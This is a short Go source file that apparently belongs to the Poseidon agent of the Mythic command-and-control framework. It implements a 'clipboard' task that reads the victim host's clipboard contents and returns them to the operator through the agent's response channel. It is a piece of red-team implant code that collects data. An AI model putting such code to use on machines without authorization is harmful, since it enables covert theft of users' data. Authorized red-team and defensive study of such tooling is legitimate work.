package clipboard

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	ReadTypes []string
}

func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["read"]; ok {
		interfaceArray := v.([]interface{})
		interfaceStringArray := make([]string, len(interfaceArray))
		for i, v := range interfaceArray {
			interfaceStringArray[i] = v.(string)
		}
		e.ReadTypes = interfaceStringArray
	}
	return nil
}

func Run(task structs.Task) {
	msg := task.NewResponse()
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	output, err := GetClipboard(args.ReadTypes)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	msg.UserOutput = output
	msg.Completed = true
	task.Job.SendResponses <- msg
	return

}
